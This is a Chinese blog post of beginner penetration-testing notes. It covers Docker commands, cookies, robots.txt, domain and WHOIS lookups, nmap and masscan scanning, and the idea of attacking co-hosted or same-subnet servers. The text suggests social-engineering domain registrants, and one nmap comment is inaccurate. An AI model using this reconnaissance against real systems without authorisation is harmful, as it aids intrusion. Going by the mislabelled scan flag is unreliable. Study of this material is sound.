<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Web安全基础, wwqstudy">
    <meta name="description" content="docker使用docker ps //查看开启容器情况
docker rm -f $(docker ps -qa) //删除所有已开启容器
docker exec -it 容器编号 /bin/sh //进入容器环境
bash -i //容">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Web安全基础 | wwqstudy</title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/favicon.png">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/css/my.css">

    <script src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 5.4.0"></head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size: 100% 100%;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">wwqstudy</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">wwqstudy</div>
        <div class="logo-desc">
            
            绘一纸潇湘，花盏玲珑如妆，雨落弦响，陌上芳华，醉影照天长
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/medias/featureimages/23.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Web安全基础</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-01-22
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    45.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    190 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/wwqstudy/wwqstudy.github.io/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">docker ps <span class="token comment">//查看开启容器情况</span>
docker rm <span class="token operator">-</span><span class="token class-name type-declaration">f</span> $<span class="token punctuation">(</span>docker ps <span class="token operator">-</span>qa<span class="token punctuation">)</span> <span class="token comment">//删除所有已开启容器</span>
docker exec <span class="token operator">-</span>it 容器编号 <span class="token operator">/</span>bin<span class="token operator">/</span>sh <span class="token comment">//进入容器环境</span>
bash <span class="token operator">-</span>i <span class="token comment">//容器快捷操作</span>
find <span class="token operator">/</span> <span class="token operator">-</span>name 文件名 <span class="token comment">//查找指定文件路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p><strong>firefox</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">FoxyProxy<span class="token operator">//</span>代理插件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="cookie-1"><a href="#cookie-1" class="headerlink" title="cookie"></a>cookie</h3><p>Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于 RFC2109 和 2965 中的都已废弃，最新取代的规范是 RFC6265。</p>
<h3 id="cookie技术简介"><a href="#cookie技术简介" class="headerlink" title="cookie技术简介"></a>cookie技术简介</h3><p>Cookie 是在 HTTP 协议下，服务器或脚本可以维护客户工作站上信息的一种方式。Cookie 是由 Web 服务器保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web 站点都可以访问 Cookie 信息。</p>
<p>目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p>
<p>持续的 Cookie 则保存在用户的 Cookie 文件中，下一次用户返回时，仍然可以对它进行调用。在 Cookie 文件中保存 Cookie，有些用户担心 Cookie 中的用户信息被一些别有用心的人窃取，而造成一定的损害。其实，网站以外的用户无法跨过网站来获得 Cookie 信息。如果因为这种担心而屏蔽 Cookie，肯定会因此拒绝访问许多站点页面。因为，当今有许多 Web 站点开发人员使用 Cookie 技术，例如 Session 对象的使用就离不开 Cookie 的支持。</p>
<h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><h3 id="robots简介"><a href="#robots简介" class="headerlink" title="robots简介"></a>robots简介</h3><p>robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p>
<p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p>
<p>如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p>
<h3 id="robots功能"><a href="#robots功能" class="headerlink" title="robots功能"></a>robots功能</h3><p>Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p>
<h2 id="信息收集1"><a href="#信息收集1" class="headerlink" title="信息收集1"></a>信息收集1</h2><p>信息收集——渗透测试的灵魂</p>
<p>为什么要信息收集？</p>
<p>有句话说“知己知彼，百战不殆”。最了解你的人往往都是你的对手。</p>
<p>当你所掌握到的信息比别人多且更详细的时候那么你就占据了先机，这一条不仅仅用于商业、战争、渗透测试中也适用。</p>
<p>信息收集的方向、究竟收集什么？</p>
<p>以 <a target="_blank" rel="noopener" href="http://www.secdriver.com/">http://www.secdriver.com/</a> 这个网站为例，你知道这个网站是谁的(注册人/机构)吗？当查到了网站所属的机构是某个公司后，那你能找到这个公司旗下拥有的其它网站吗？你访问网站后发现他是某个机构的官网，那你能发现这个网站使用了什么编程语言，php还是jsp；使用了什么WEB容器，apache还是iis ; 网站的后台地址是什么；网站使用的服务器是windows还是linux，服务器的ip是什么, 这个ip上都开放了哪些端口?；这个网站是不是某一款流行的cms产品？。</p>
<p>带着这些问题，让我们开始今天的学习 ~~~</p>
<h3 id="1-域名信息查询"><a href="#1-域名信息查询" class="headerlink" title="1.域名信息查询"></a><strong>1.域名信息查询</strong></h3><h4 id="什么是域名？"><a href="#什么是域名？" class="headerlink" title="什么是域名？"></a><strong>什么是域名？</strong></h4><p><strong>域名</strong>（<strong>Domain Name</strong>），又称<strong>网域</strong>，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。</p>
<p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p>
<p>计算机是不认识域名的，域名只是为了方便人们记忆而进行创建的</p>
<p>域名解析示例：secdriver.com -&gt; DNS 服务器 114.114.114.114 -&gt; 47.94.98.63</p>
<p>域名ip查询：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ping secdriver.com  # ping DNS解析
nslookup secdriver.com  # nslookup DNS解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/1.PNG" alt=" "></p>
<h4 id="域名级别"><a href="#域名级别" class="headerlink" title="域名级别"></a><strong>域名级别</strong></h4><p>域名可分为不同级别，包括顶级域名、二级域名等</p>
<h5 id="顶级域名"><a href="#顶级域名" class="headerlink" title="顶级域名"></a><strong>顶级域名</strong></h5><p><strong>国家顶级域名</strong>（national top-level domainnames，简称nTLDs），200多个国家都按照ISO3166国家代码分配了顶级域名，例如中国是 .cn，美国是 .us，日本是 .jp 等</p>
<p><strong>国际顶级域名</strong>（international top-level domain names，简称iTDs），例如表示工商企业的 .com，表示网络提供商的 .net，表示顶级标杆、个人的 .top，表示非盈利组织的.org等</p>
<h5 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a><strong>二级域名</strong></h5><p>二级域名是指顶级域名之下的域名，在国际顶级域名下，它是指域名注册人的网上名称，例如”.ibm”，”.yahoo”，”.microsoft”等；在国家顶级域名下，它是表示注册企业类别的符号</p>
<h5 id="三级域名"><a href="#三级域名" class="headerlink" title="三级域名"></a><strong>三级域名</strong></h5><p>三级域名用字母（a～z）、数字（0～9）和连接符（－）组成， 各级域名之间用实点（.）连接，三级域名的长度不能超过20个字符，域名长度有限，最多可注册63个字符，域名总长度不能超过253个字符</p>
<h4 id="什么是子域名？"><a href="#什么是子域名？" class="headerlink" title="什么是子域名？"></a><strong>什么是子域名？</strong></h4><p><strong>子域名</strong>（<strong>Subdomain</strong>）是在域名系统等级中，属于更高一层域的域。比如，mail.example.com和calendar.example.com是example.com的两个子域，而example.com则是顶级域 .com 的子域。</p>
<p>子域名示例：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">主域名：secdriver.com
子域名：
www.secdriver.com
edu.secdriver.com
mail.secdriver.com
ctf.secdriver.com
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a><strong>IP反查域名</strong></h4><p>通过IP可以反查出绑定在该网站的域名，来发现更多资产</p>
<p>ip138: <a target="_blank" rel="noopener" href="https://site.ip138.com/">https://site.ip138.com/</a></p>
<p>webscan: <a target="_blank" rel="noopener" href="https://www.webscan.cc/">https://www.webscan.cc/</a></p>
<p>VirusTotal: <a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com</a></p>
<p>微步在线：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
<h4 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a><strong>Whois查询</strong></h4><p>whois指的是域名注册时留下的信息，比如留下管理员的名字、电话号码、邮箱。知道目标的域名之后，我们要做的第一件事就是获取域名的whois信息，因为域名注册人可能是网站管理员，可以尝试社工、套路，查询是不是注册了其他域名扩大攻击范围。</p>
<h5 id="查询网站"><a href="#查询网站" class="headerlink" title="查询网站"></a><strong>查询网站</strong></h5><p>爱站工具网: <a target="_blank" rel="noopener" href="https://whois.aizhan.com/">https://whois.aizhan.com</a></p>
<p>站长之家: <a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com</a></p>
<p>VirusTotal: <a target="_blank" rel="noopener" href="https://www.virustotal.com/">https://www.virustotal.com</a></p>
<p>通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等。</p>
<h5 id="kali工具"><a href="#kali工具" class="headerlink" title="kali工具"></a><strong>kali工具</strong></h5><p>whois 域名</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">whois www.secdriver.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="ICP备案信息查询"><a href="#ICP备案信息查询" class="headerlink" title="ICP备案信息查询"></a><strong>ICP备案信息查询</strong></h4><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p>
<p>常用的网站有以下几个：</p>
<p>工业和信息化部政务服务平台：<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p>
<p>全国互联网安全管理平台：<a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery">http://www.beian.gov.cn/portal/recordQuery</a></p>
<p>天眼查：<a target="_blank" rel="noopener" href="http://www.tianyancha.com/">http://www.tianyancha.com</a></p>
<h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a><strong>子域名收集</strong></h4><p>假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标。</p>
<h5 id="网站查询子域名"><a href="#网站查询子域名" class="headerlink" title="网站查询子域名"></a><strong>网站查询子域名</strong></h5><p>VirusTotal <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p>
<p>fofa <a target="_blank" rel="noopener" href="https://fofa.info/">https://fofa.info/</a></p>
<h5 id="工具扫描"><a href="#工具扫描" class="headerlink" title="工具扫描"></a><strong>工具扫描</strong></h5><p>Layer子域名挖掘机</p>
<p><img src="/2023/012220963/4.PNG" alt="4"></p>
<h3 id="2-端口信息"><a href="#2-端口信息" class="headerlink" title="2.端口信息"></a><strong>2.端口信息</strong></h3><p>计算机“端口”是英文port的义译，可以认为是计算机与外界通讯交流的出口，计算机有0~65535，共计65536个端口。</p>
<p>端口作为服务器和客户端交互的接口，起着非常重要的作用。一些常见的端口标识出服务器开启了什么服务，比如3389端口开启，可以认为服务器系统为windows并且开启了远程服务的功能。所以，端口扫描在渗透测试中是非常重要的。</p>
<h4 id="插件探测"><a href="#插件探测" class="headerlink" title="插件探测"></a><strong>插件探测</strong></h4><h5 id="Fofa-Pro-view"><a href="#Fofa-Pro-view" class="headerlink" title="Fofa Pro view"></a><strong>Fofa Pro view</strong></h5><p><img src="/2023/012220963/5.png" alt="5"></p>
<h5 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><strong>shodan</strong></h5><p><img src="/2023/012220963/6.png" alt="6"></p>
<h4 id="工具扫描-1"><a href="#工具扫描-1" class="headerlink" title="工具扫描"></a><strong>工具扫描</strong></h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h5><p>nmap 是一款开源免费的针对大型网络的端口扫描工具，nmap可以检测目标主机是否在线、主机端口开放情况、检测主机运行的服务类型及版本信息、检测操作系统与设备类型等信息</p>
<p>nmap常用参数</p>
<p><img src="/2023/012220963/2.PNG" alt="2"></p>
<h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a><strong>基本使用</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap 192.168.23.1  # Nmap 默认发送⼀个arp的ping数据包，来探测⽬标主机在1-10000范围内所开放的端⼝<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h6 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a><strong>主机发现</strong></h6><p>主机发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sP 192.168.1.0&#x2F;24  # 进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试端口扫描或者操作系统探测<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h6 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a><strong>操作系统识别</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -O 192.168.23.1     # 操作系统版本探测
nmap -O --osscan-limit 192.168.23.1  # 探测操作系统版本详细信息
nmap -O --osscan-guess 192.168.23.1  # 猜测操作系统版本
nmap -A 192.168.23.1     # 操作系统探测和服务版本探测等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sT 192.168.23.1 -p 21,22,23,53,80,135,443,445 # (默认) TCP全连接扫描,常见端口
nmap -sS 192.168.23.1 -p 1-3000 --open -vv  # (常用) 快速扫描 1-3000 范围端口,只显示开放端口信息
nmap -PN 192.168.23.1 -p 1-3000  # 不使用ping命令扫描
nmap -PR 192.168.23.1 -p 1-3000  # arp扫描，内网中局域网防火墙不拦截，速度很快
nmap -P0 192.168.23.1 -p 1-3000  # 空闲扫描，不会留下记录
nmap -sV 192.168.81.148 -p 3389,5985,6588,999,21,80 -A  # 探测端口信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a><strong>格式化输出</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 使用 nmap 结果美化 model, 美化 nmap 输出的 xml 文档，使用-oX xxx.xml 或者 -oA xxx 可
将结果导出为 xml 格式
# 端口信息探测 + 系统探测 + 基础扫描
nmap -sV -A 192.168.23.1 -p 80,88,135,139,443,445,903,1080,1688,3306,5357 -oA mysite
# 格式化 xml 文档
xsltproc -o mysite.html mode.xsl mysite.xml
# 使用浏览器打开 html 文档
firefox mysite.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a><strong>常见端口</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a><strong>masscan</strong></h5><p>masscan 是 Kali 下集成的高效扫描器 , 速度非常快</p>
<p>masscan 常用参数</p>
<p><img src="/2023/012220963/3.PNG" alt="3"></p>
<h6 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a><strong>基本用法</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan 192.168.23.1 -p 1-3000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h6 id="枚举C段"><a href="#枚举C段" class="headerlink" title="枚举C段"></a><strong>枚举C段</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-sL 参数可以枚举网段
masscan -sL 10.0.0.0&#x2F;24 &gt; c段.txt
masscan -sL 10.0.0.0&#x2F;16 &gt; b段.txt
masscan -sL 10.0.0.0&#x2F;8 &gt; a段.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="端口御剑扫描"><a href="#端口御剑扫描" class="headerlink" title="端口御剑扫描"></a><strong>端口御剑扫描</strong></h6><h3 id="3-C段和旁站"><a href="#3-C段和旁站" class="headerlink" title="3.C段和旁站"></a><strong>3.C段和旁站</strong></h3><h4 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a><strong>旁站</strong></h4><p>旁注：同服务器不同站点的渗透方案</p>
<p>旁站指的是网站所在服务器上部署的其他网站，同IP网站，一个IP上布置了多个网站从同台服务器上的其他网站入手，获取到服务器权限，自然就获取到了目标网站的权限</p>
<h4 id="C段"><a href="#C段" class="headerlink" title="C段"></a><strong>C段</strong></h4><p><strong>C段</strong>：同网段不同服务器的渗透方案</p>
<p>C 段嗅探指的是拿下同一C段下的服务器，也就是说是D段1-255中的一台服务器，再通过内网横向移动获取你想要的服务器权限。</p>
